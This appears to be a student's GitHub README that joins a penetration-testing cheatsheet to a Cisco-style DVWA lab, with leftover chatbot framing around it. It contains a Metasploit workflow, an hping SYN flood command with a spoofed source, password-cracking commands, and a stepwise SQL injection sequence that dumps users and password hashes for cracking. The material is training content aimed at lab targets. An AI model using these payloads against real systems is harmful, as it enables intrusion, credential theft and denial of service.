# piedPiper
Here’s a `README.md` formatted version of the content from your **VAPT Cheatsheet** document, suitable for a GitHub repository:

---

# VAPT Cheatsheet

This repository contains a summarized guide and commonly used commands for Vulnerability Assessment and Penetration Testing (VAPT). It includes reconnaissance tools, exploitation strategies, social engineering, SQL injection, password cracking, and more.

---

## 🔍 Reconnaissance

### Tools:
- **EtterCap**
   - Find IPs
- **Wireshark**
- **Nmap**  
  - Find IPs  
  - Discover Open Ports  
  - Identify Version Info  

---

## ⚔️ Exploitation

### Tools:
- **Metasploit Framework**

### Typical Workflow:
```bash
msfconsole
search <port name with version>
use <index of module>
show options
set RHOST <target-ip>
set LHOST <your-ip>
set PAYLOAD <payload-type>  # if needed
run
```

### Unprotected Ports List:
```
20/21  - FTP  
23     - Telnet  
25     - SMTP  
53     - DNS  
80     - HTTP  
110    - POP3  
389    - LDAP  
445    - SMB  
8080   - HTTP Proxy  
3389   - RDP  
```

---

## 🐚 FTP Attack Example
> <a href="https://prafulnair.medium.com/hacking-with-reverse-shell-part-2-2491abd99dc6">Hacking with Reverse Shell — *Part 2* by Praful Nair</a>

---

## 🎭 Social Engineering

### Toolkit:
- **SET (Social Engineering Toolkit)**

### Examples:
- <a href="https://medium.com/@kerenod4/credential-harvesting-using-kali-linux-credential-harvesting-using-set-social-engineering-c5351f64a439">Credential Harvesting using Kali Linux</a>  
- <a href="https://amanutkhedkar.medium.com/powershell-reverse-shell-via-social-engineering-toolkit-591ca034a12d">PowerShell Reverse Shell via SET</a>  
- Write and send phishing emails

---

## 💥 DoS / DDoS Attacks

### Tools:
- **EtterCap**
- **Wireshark**
- **Nmap**
- **hping**
```bash
hping -S <target-ip> -a <spoofed-host-ip> -p 23 --flood
# -S for SYN flood
# -F -P -U for XMAS scan (FIN, PUSH, URG)
```

---

## 🧪 SQL Injection

### Platforms:
- **WebGoat**
- **DVWA**

### CheatSheet
- <a href="https://www.researchgate.net/figure/Retrieve-all-tables-in-the-dvwa-database-12-There-are-two-tables-in-the-database-based_fig8_354874121"> CheatSheet </a>

### Example Payloads:
```sql
1' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'#
```

---

## 🔓 Password Cracking

### Tools:
- **John the Ripper**
- **Hydra**
- **Hashcat**
```bash
hashcat -a <attack-mode> -m <hash-mode> <hash-file> /usr/share/wordlists/rockyou.txt
```

---

## 📚 Exam Notes / Misc

```bash
# Nmap Example
nmap -p 80,8180,10000 --script=http-enum,http-title,http-headers 192.168.161.137 | grep "controlpanel"

# Vulnerability Scan
nmap -p 21 --script vuln 192.168.161.137

# Metasploit usage
msfconsole
search
show options
set RHOST <target-ip>

# John the Ripper usage
john --show pass.txt
nano pass.txt

# Example Credentials:
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/
Username:Password => msfadmin:msfadmin
```

Here is a GitHub `README.md` version of your **Lab - Injection Attacks** document, formatted clearly for use in a cybersecurity or ethical hacking repository:

---

# 💉 Lab: Injection Attacks (DVWA - SQL Injection)

This lab focuses on demonstrating SQL Injection vulnerabilities using the **Damn Vulnerable Web Application (DVWA)** and exploring SQL Injection **mitigation** strategies.

---

## 🎯 Objectives

Websites that are connected to backend databases can be vulnerable to SQL injection. In a SQL injection exploit, an attacker enters malicious queries that interact with the application database. In this lab, you will exploit a web site vulnerability with SQL injection and research SQL injection mitigation.
   - Part 1: Exploit an SQL Injection Vulnerability on DVWA
   - Part 2: Research SQL Injection Mitigation


---

## Background / Scenario
SQL injection is a common attack used by hackers to exploit SQL database-driven web applications. This type of attack involves inserting malicious SQL code or statements into an input field or URL with the goal of reveling or manipulating the database contents, causing repudiation system issues, or spoofing identities.

---
Here is a direct `README.md` conversion of your lab instructions, formatted to preserve the structure and clarity of the original Cisco-style documentation, but readable as a Markdown file for GitHub:

---

## 🧰 Required Resources
- Kali VM customized for the Ethical Hacker course  
- Internet access  

---

## 📝 Instructions

### Part 1: Exploit an SQL Injection Vulnerability on DVWA

SQL injection is a code injection technique used to exploit security vulnerabilities in the database layer of an application. These vulnerabilities could allow an attacker to execute malicious SQL commands and compromise the security of the database.

In this part you will exploit a SQL vulnerability on the DVWA.

---

### 🔧 Step 1: Prepare DVWA for SQL Injection Exploit

- Open your browser and navigate to the DVWA at: `http://10.6.6.13`
- Enter the credentials:  
  ```
  Username: admin  
  Password: password
  ```
- Set DVWA to **Low Security**:
  - Click `DVWA Security` in the left pane
  - Change the security level to **Low** and click **Submit**

---

### 🧪 Step 2: Check DVWA to See If a SQL Injection Vulnerability is Present

- Click `SQL Injection` in the left pane
- In the **User ID** field type:
  ```sql
  ' OR 1=1 #
  ```
- Click **Submit**

Expected output:
```
ID: ' or 1=1 #
First name: admin
Surname: admin

First name: Gordon
Surname: Brown

First name: Hack
Surname: Me

First name: Pablo
Surname: Picasso

First name: Bob
Surname: Smith
```

This confirms the presence of an SQL injection vulnerability.

---

### 🔢 Step 3: Check for Number of Fields in the Query

Try the following inputs:

```sql
1' ORDER BY 1 #
1' ORDER BY 2 #
1' ORDER BY 3 #
```

The third query will return:
```
Unknown column '3' in 'order clause'
```

➡️ This means the query uses **2 fields**.

---

### 🛠 Step 4: Check for Version of Database Management System (DBMS)

Input:
```sql
1' OR 1=1 UNION SELECT 1, VERSION()#
```

Expected Output:
```
Surname: 5.5.58-0+deb8u1
```

➡️ Indicates the DBMS is **MySQL version 5.5.58 on Debian**

---

### 🗃 Step 5: Determine the Database Name

Input:
```sql
1' OR 1=1 UNION SELECT 1, DATABASE()#
```

Expected Output:
```
Surname: dvwa
```

➡️ Database name is: **dvwa**

---

### 🗂 Step 6: Retrieve Table Names from the dvwa Database

Input:
```sql
1' OR 1=1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa'#
```

Expected Output:
```
First Name: 1
Surname: [table names]
```

#### 📌 Answer Area:
- What are the two tables that were found?  
- Which table do you think is the most interesting for a penetration test?

---

### 🔍 Step 7: Retrieve Column Names from the `users` Table

Input:
```sql
1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#
```

#### 📌 Answer Area:
- Which two columns are of most interest for the penetration test?  
- Explain why.

---

### 🧑‍💻 Step 8: Retrieve the User Credentials

Input:
```sql
1' OR 1=1 UNION SELECT user, password FROM users #
```

Expected Output:
- Usernames and password hashes will appear

#### 📌 Answer Area:
- Which account could be the most valuable in our pentest?  
- Try crafting queries to display contents of other fields  
- What is the difference between the `user_id` and `user` fields?

---

### 🔓 Step 9: Hack the Password Hashes

- Open [https://crackstation.net](https://crackstation.net)
- Paste the password hashes retrieved from DVWA
- Click **Crack Hashes**

#### 📌 Answer Area:
- What is the password of the **admin** account?  
- What is the password for the user **pablo**?

---

## Part 2: Research SQL Injection Mitigation

### 🔍 Step 1: Research Mitigation Techniques

- Open a web browser  
- Search for:
  - `SQL injection mitigation`
  - `SQL injection prevention`
- Take notes on your findings

---

### 💡 Reflection Questions

#### 📌 Answer Area:
- What are **three mitigation methods** for preventing SQL injection exploits?

---

© 2017 - 2023 Cisco and/or its affiliates. All rights reserved. Cisco Public

---

Let me know if you’d like this exported as a `.md` file or bundled with previous content.
